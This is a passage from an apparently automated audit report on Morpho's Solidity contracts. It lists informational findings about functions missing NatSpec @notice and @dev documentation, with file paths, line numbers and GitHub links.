23:     function version() external view returns (string memory);

/// @audit missed @notice
25:     function baseToken() external view returns (address);

/// @audit missed @notice
27:     function userCollateral(address account, address asset) external view returns (uint256);

/// @audit missed @notice
29:     function balanceOf(address account) external view returns (uint256);

/// @audit missed @notice
31:     function borrowBalanceOf(address account) external view returns (uint256);

/// @audit missed @notice
33:     function supply(address asset, uint256 amount) external;

/// @audit missed @notice
35:     function supplyTo(address dst, address asset, uint256 amount) external;

/// @audit missed @notice
37:     function supplyFrom(address from, address dst, address asset, uint256 amount) external;

/// @audit missed @notice
39:     function withdraw(address asset, uint256 amount) external;

/// @audit missed @notice
41:     function withdrawFrom(address src, address to, address asset, uint256 amount) external;

/// @audit missed @notice
43:     function allowBySig(

```

[21](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L21), [23](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L23), [25](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L25), [27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L27), [29](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L29), [31](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L31), [33](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L33), [35](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L35), [37](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L37), [39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L39), [41](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L41), [43](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L43)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

/// @audit missed @notice
5:     function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L5)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

/// @audit missed @notice
94:     function borrowRateView(MarketParams memory marketParams, Market memory market) external view returns (uint256) {

/// @audit missed @notice
100:     function borrowRate(MarketParams memory marketParams, Market memory market) external returns (uint256) {

/// @audit missed @notice
117:     function _borrowRate(Id id, Market memory market) private view returns (uint256, int256) {

/// @audit missed @notice
175:     function _curve(int256 _rateAtTarget, int256 err) private view returns (int256) {

/// @audit missed @notice
184:     function _newRateAtTarget(int256 startRateAtTarget, int256 linearAdaptation) private pure returns (int256) {

```

[94](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L94), [100](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L100), [117](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L117), [175](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L175), [184](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L184)

```solidity
File: morpho-blue-irm/src/libraries/MathLib.sol

/// @audit missed @notice
13:     function wMulDown(int256 a, int256 b) internal pure returns (int256) {

/// @audit missed @notice
17:     function wDivDown(int256 a, int256 b) internal pure returns (int256) {

```

[13](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L13), [17](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L17)

```solidity
File: morpho-blue-irm/src/libraries/UtilsLib.sol

/// @audit missed @notice
11:     function bound(int256 x, int256 low, int256 high) internal pure returns (int256 z) {

```

[11](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/UtilsLib.sol#L11)

```solidity
File: morpho-blue-oracles/src/ChainlinkOracle.sol

/// @audit missed @notice
56:     constructor(

/// @audit missed @notice
116:     function price() external view returns (uint256) {

```

[56](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L56), [116](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L116)

```solidity
File: morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol

/// @audit missed @notice
7:     function decimals() external view returns (uint8);

/// @audit missed @notice
9:     function description() external view returns (string memory);

/// @audit missed @notice
11:     function version() external view returns (uint256);

/// @audit missed @notice
13:     function getRoundData(uint80 _roundId)

/// @audit missed @notice
18:     function latestRoundData()

```

[7](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L7), [9](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L9), [11](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L11), [13](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L13), [18](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L18)

```solidity
File: morpho-blue-oracles/src/interfaces/IERC4626.sol

/// @audit missed @notice
5:     function convertToAssets(uint256) external view returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L5)

```solidity
File: morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol

/// @audit missed @notice
20:     function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {

/// @audit missed @notice
31:     function getDecimals(AggregatorV3Interface feed) internal view returns (uint256) {

```

[20](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L20), [31](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L31)

```solidity
File: morpho-blue-oracles/src/libraries/VaultLib.sol

/// @audit missed @notice
13:     function getAssets(IERC4626 vault, uint256 shares) internal view returns (uint256) {

```

[13](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/VaultLib.sol#L13)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

/// @audit missed @notice
183:     function _setRoot(bytes32 newRoot, bytes32 newIpfsHash) internal {

/// @audit missed @notice
193:     function _setOwner(address newOwner) internal {

/// @audit missed @notice
200:     function _setTimelock(uint256 newTimelock) internal {

```

[183](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L183), [193](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L193), [200](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L200)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

/// @audit missed @notice
18:     function root() external view returns (bytes32);

/// @audit missed @notice
19:     function owner() external view returns (address);

/// @audit missed @notice
20:     function timelock() external view returns (uint256);

/// @audit missed @notice
21:     function ipfsHash() external view returns (bytes32);

/// @audit missed @notice
22:     function isUpdater(address) external view returns (bool);

/// @audit missed @notice
23:     function claimed(address, address) external view returns (uint256);

/// @audit missed @notice
25:     function acceptRoot() external;

/// @audit missed @notice
26:     function setRoot(bytes32 newRoot, bytes32 newIpfsHash) external;

/// @audit missed @notice
27:     function setTimelock(uint256 newTimelock) external;

/// @audit missed @notice
28:     function setRootUpdater(address updater, bool active) external;

/// @audit missed @notice
29:     function revokePendingRoot() external;

/// @audit missed @notice
30:     function setOwner(address newOwner) external;

/// @audit missed @notice
32:     function submitRoot(bytes32 newRoot, bytes32 ipfsHash) external;

/// @audit missed @notice
34:     function claim(address account, address reward, uint256 claimable, bytes32[] memory proof)

/// @audit missed @notice
43:     function pendingRoot() external view returns (bytes32 root, bytes32 ipfsHash, uint256 validAt);

/// @audit missed @notice
52:     function pendingRoot() external view returns (PendingRoot memory);

```

[18](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L18), [19](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L19), [20](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L20), [21](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L21), [22](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L22), [23](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L23), [25](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L25), [26](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L26), [27](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L27), [28](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L28), [29](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L29), [30](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L30), [32](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L32), [34](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L34), [43](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L43), [52](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L52)




### Function declaration should include NatSpec `@dev` documentation	_(duplicate of [NatSpec: Functions declarations should have @notice, @param and @return tags and NatSpec descriptions])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (251)*:


```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

/// @audit missed @dev
38:     constructor(string memory name_, string memory symbol_, IERC20 underlyingToken, address morpho, address bundler)

/// @audit missed @dev
58:     function decimals() public view virtual override(ERC20, ERC20Wrapper) returns (uint8) {

```

[38](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L38), [58](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L58)

```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit missed @dev
186:     function setCurator(address newCurator) external onlyOwner {

/// @audit missed @dev
195:     function setIsAllocator(address newAllocator, bool newIsAllocator) external onlyOwner {

/// @audit missed @dev
204:     function setSkimRecipient(address newSkimRecipient) external onlyOwner {

/// @audit missed @dev
233:     function setFee(uint256 newFee) external onlyOwner {

/// @audit missed @dev
248:     function setFeeRecipient(address newFeeRecipient) external onlyOwner {

/// @audit missed @dev
325:     function setSupplyQueue(Id[] calldata newSupplyQueue) external onlyAllocatorRole {

/// @audit missed @dev
346:     function updateWithdrawQueue(uint256[] calldata indexes) external onlyAllocatorRole {

/// @audit missed @dev
451:     function revokePendingTimelock() external onlyGuardianRole {

/// @audit missed @dev
460:     function revokePendingGuardian() external onlyGuardianRole {

/// @audit missed @dev
469:     function revokePendingCap(Id id) external onlyCuratorOrGuardianRole {

/// @audit missed @dev
478:     function revokePendingMarketRemoval(Id id) external onlyCuratorOrGuardianRole {

/// @audit missed @dev
487:     function supplyQueueLength() external view returns (uint256) {

/// @audit missed @dev
492:     function withdrawQueueLength() external view returns (uint256) {

/// @audit missed @dev
497:     function acceptTimelock() external afterTimelock(pendingTimelock.validAt) {

/// @audit missed @dev
502:     function acceptGuardian() external afterTimelock(pendingGuardian.validAt) {

/// @audit missed @dev
507:     function acceptCap(Id id) external afterTimelock(pendingCap[id].validAt) {

/// @audit missed @dev
513:     function skim(address token) external {

/// @audit missed @dev
526:     function decimals() public view override(ERC20, ERC4626) returns (uint8) {

/// @audit missed @dev
531:     function maxDeposit(address) public view override returns (uint256) {

/// @audit missed @dev
536:     function maxMint(address) public view override returns (uint256) {

/// @audit missed @dev
559:     function deposit(uint256 assets, address receiver) public override returns (uint256 shares) {

/// @audit missed @dev
572:     function mint(uint256 shares, address receiver) public override returns (uint256 assets) {

/// @audit missed @dev
585:     function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {

/// @audit missed @dev
599:     function redeem(uint256 shares, address receiver, address owner) public override returns (uint256 assets) {

/// @audit missed @dev
613:     function totalAssets() public view override returns (uint256 assets) {

/// @audit missed @dev
622:     function _decimalsOffset() internal pure override returns (uint8) {

```

[186](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L186), [195](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L195), [204](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L204), [233](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L233), [248](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L248), [325](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L325), [346](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L346), [451](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L451), [460](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L460), [469](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L469), [478](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L478), [487](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L487), [492](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L492), [497](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L497), [502](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L502), [507](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L507), [513](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L513), [526](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L526), [531](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L531), [536](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L536), [559](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L559), [572](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L572), [585](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L585), [599](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L599), [613](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L613), [622](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L622)

```solidity
File: metamorpho/src/MetaMorphoFactory.sol

/// @audit missed @dev
43:     function createMetaMorpho(

```

[43](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L43)

```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

/// @audit missed @dev
19:     function multicall(bytes[] calldata) external returns (bytes[] memory);

/// @audit missed @dev
23:     function owner() external returns (address);

/// @audit missed @dev
24:     function transferOwnership(address) external;

/// @audit missed @dev
25:     function renounceOwnership() external;

/// @audit missed @dev
26:     function acceptOwnership() external;

/// @audit missed @dev
27:     function pendingOwner() external view returns (address);

/// @audit missed @dev
33:     function MORPHO() external view returns (IMorpho);

/// @audit missed @dev
35:     function curator() external view returns (address);

/// @audit missed @dev
36:     function isAllocator(address target) external view returns (bool);

/// @audit missed @dev
37:     function guardian() external view returns (address);

/// @audit missed @dev
39:     function fee() external view returns (uint96);

/// @audit missed @dev
40:     function feeRecipient() external view returns (address);

/// @audit missed @dev
41:     function skimRecipient() external view returns (address);

/// @audit missed @dev
42:     function timelock() external view returns (uint256);

/// @audit missed @dev
43:     function supplyQueue(uint256) external view returns (Id);

/// @audit missed @dev
44:     function supplyQueueLength() external view returns (uint256);

/// @audit missed @dev
45:     function withdrawQueue(uint256) external view returns (Id);

/// @audit missed @dev
46:     function withdrawQueueLength() external view returns (uint256);

/// @audit missed @dev
48:     function lastTotalAssets() external view returns (uint256);

/// @audit missed @dev
50:     function submitTimelock(uint256 newTimelock) external;

/// @audit missed @dev
51:     function acceptTimelock() external;

/// @audit missed @dev
52:     function revokePendingTimelock() external;

/// @audit missed @dev
54:     function submitCap(MarketParams memory marketParams, uint256 supplyCap) external;

/// @audit missed @dev
55:     function acceptCap(Id id) external;

/// @audit missed @dev
56:     function revokePendingCap(Id id) external;

/// @audit missed @dev
58:     function submitMarketRemoval(Id id) external;

/// @audit missed @dev
59:     function revokePendingMarketRemoval(Id id) external;

/// @audit missed @dev
61:     function submitGuardian(address newGuardian) external;

/// @audit missed @dev
62:     function acceptGuardian() external;

/// @audit missed @dev
63:     function revokePendingGuardian() external;

/// @audit missed @dev
65:     function skim(address) external;

/// @audit missed @dev
67:     function setIsAllocator(address newAllocator, bool newIsAllocator) external;

/// @audit missed @dev
68:     function setCurator(address newCurator) external;

/// @audit missed @dev
69:     function setFee(uint256 newFee) external;

/// @audit missed @dev
70:     function setFeeRecipient(address newFeeRecipient) external;

/// @audit missed @dev
71:     function setSkimRecipient(address) external;

/// @audit missed @dev
73:     function setSupplyQueue(Id[] calldata newSupplyQueue) external;

/// @audit missed @dev
74:     function updateWithdrawQueue(uint256[] calldata indexes) external;

/// @audit missed @dev
75:     function reallocate(MarketAllocation[] calldata allocations) external;

/// @audit missed @dev
81:     function config(Id) external view returns (uint184 cap, bool enabled, uint64 removableAt);

/// @audit missed @dev
82:     function pendingGuardian() external view returns (address guardian, uint64 validAt);

/// @audit missed @dev
83:     function pendingCap(Id) external view returns (uint192 value, uint64 validAt);

/// @audit missed @dev
84:     function pendingTimelock() external view returns (uint192 value, uint64 validAt);

/// @audit missed @dev
92:     function config(Id) external view returns (MarketConfig memory);

/// @audit missed @dev
93:     function pendingGuardian() external view returns (PendingAddress memory);

/// @audit missed @dev
94:     function pendingCap(Id) external view returns (PendingUint192 memory);

/// @audit missed @dev
95:     function pendingTimelock() external view returns (PendingUint192 memory);

```

[19](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L19), [23](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L23), [24](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L24), [25](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L25), [26](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L26), [27](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L27), [33](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L33), [35](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L35), [36](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L36), [37](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L37), [39](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L39), [40](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L40), [41](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L41), [42](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L42), [43](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L43), [44](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L44), [45](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L45), [46](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L46), [48](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L48), [50](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L50), [51](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L51), [52](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L52), [54](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L54), [55](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L55), [56](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L56), [58](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L58), [59](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L59), [61](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L61), [62](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L62), [63](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L63), [65](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L65), [67](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L67), [68](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L68), [69](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L69), [70](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L70), [71](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L71), [73](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L73), [74](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L74), [75](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L75), [81](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L81), [82](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L82), [83](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L83), [84](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L84), [92](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L92), [93](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L93), [94](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L94), [95](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L95)

```solidity
File: metamorpho/src/interfaces/IMorphoMarketParams.sol

/// @audit missed @dev
7:     function idToMarketParams(Id id) external view returns (MarketParams memory marketParams);

```

[7](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L7)

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

/// @audit missed @dev
26:     constructor(address morpho) {

/// @audit missed @dev
34:     function onMorphoSupply(uint256, bytes calldata data) external {

/// @audit missed @dev
39:     function onMorphoSupplyCollateral(uint256, bytes calldata data) external {

/// @audit missed @dev
44:     function onMorphoRepay(uint256, bytes calldata data) external {

/// @audit missed @dev
49:     function onMorphoLiquidate(uint256, bytes calldata data) external {

/// @audit missed @dev
54:     function onMorphoFlashLoan(uint256, bytes calldata data) external {

/// @audit missed @dev
65:     function morphoSetAuthorizationWithSig(

/// @audit missed @dev
263:     function morphoFlashLoan(address token, uint256 assets, bytes calldata data) external payable protected {

/// @audit missed @dev
